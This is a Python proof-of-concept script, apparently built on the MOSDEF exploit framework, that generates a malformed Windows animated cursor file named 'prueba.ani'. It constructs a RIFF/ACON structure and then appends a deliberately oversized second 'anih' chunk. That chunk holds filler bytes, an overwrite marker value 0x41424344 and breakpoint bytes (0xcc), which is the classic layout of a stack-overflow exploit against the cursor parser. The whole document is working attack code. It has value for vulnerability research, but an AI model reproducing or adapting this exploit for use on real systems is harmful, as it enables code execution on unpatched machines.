#!/usr/bin/env python
import sys
import struct

if "." not in sys.path: sys.path.append(".")

from MOSDEF.mosdefutils import *


#DWORD cbSizeOf; // Num bytes in AniHeader (36 bytes)
#DWORD cFrames; // Number of unique Icons in this cursor
#DWORD cSteps; // Number of Blits before the animation cycles
#DWORD cx, cy; // reserved, must be zero.
#DWORD cBitCount, cPlanes; // reserved, must be zero.
#DWORD JifRate; // Default Jiffies (1/60th of a second) if rate chunk not present.
#DWORD flags; // Animation Flag (see AF_ constants)

class ANIHDR:
   def __init__(self):
       self.fmt       = "L" * 9
       self.Length    = 0
       self.cbSizeOf  = 0
       self.cFrames   = 0
       self.cSteps    = 0
       self.cx        = 0
       self.cy        = 0
       self.cBitCount = 0
       self.cPlanes   = 0
       self.JifRate   = 0
       self.flags     = 0

   def raw(self):
       if not self.Length:
          self.Length = 36
       if not self.cbSizeOf:
          self.cbSizeOf = 36

       return "anih" + intel_order(self.Length) + struct.pack(self.fmt, self.cbSizeOf, self.cFrames, self.cSteps, self.cx, self.cy,\
           self.cBitCount, self.cPlanes, self.JifRate, self.flags)

       return 

class RIFF:
   def __init__(self, Length = None):
       self.Length = Length
       self.padtolength=0
       self.list = []
   
   def addACON(self):
       self.list.append("ACON")

   def addRAW(self, raw, length = False): # calculate lenght?
       if length:
           self.list.append( intel_order( len(raw) ) + raw )
       else:
          self.list.append( raw )


   def addLIST(self, data, length = None):
       if not length:
          length = len( data )

       pad = ""
       if len( data ) % 4 :
           pad = "\x00" * ( 4 - len(data) % 4 )

       self.list.append( "TSIL" + intel_order( length ) + data + pad )

   def addANIH(self, packet):
       self.list.append( packet.raw() )
         
   def raw(self):
       tmp = "".join( self.list) 
       if self.Length:
          length = self.Length
       else:
          if self.padtolength:
             tmp+="A"*(self.padtolength - len(tmp))
          length = len( tmp )
          
       return 'RIFF' + intel_order( length ) + tmp

if __name__ == '__main__':
       r = RIFF()
       r.addACON()

       an = ANIHDR()
       an.cFrames = 0xFFFF
       an.cSteps  = 0x9
       an.JifRate = 0x4
       an.flags   = 0x1
       r.addANIH( an )
       r.addLIST( "\x00" * 3 )
       r.addLIST( "\x02" * 4 )
       # crafting our bougs ANIHR 
       #            total
       data =  "A" * (0x50-0x10) + intel_order(0x0) + "A" * 0xc + intel_order(0x41424344) + "\xcc" * 0x40
       r.addRAW( "anih" + intel_order( len(data) ) + data)  
       f=open("prueba.ani", "wb")
       f.write( r.raw() )
       f.close()
      
